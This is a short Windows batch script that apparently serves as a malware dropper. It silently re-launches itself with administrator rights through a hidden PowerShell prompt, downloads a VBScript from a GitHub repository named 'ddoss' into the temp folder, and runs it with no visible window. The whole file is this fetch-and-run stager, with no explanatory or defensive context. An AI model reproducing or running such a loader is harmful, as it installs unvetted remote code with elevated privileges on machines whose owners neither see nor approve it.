@echo off
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb RunAs -WindowStyle Hidden"
    exit /b
)

set "url=https://raw.githubusercontent.com/srap18/ddoss/main/run.vbs"
set "temp=%temp%\run.vbs"

powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%url%', '%temp%')"
wscript //B //Nologo "%temp%"
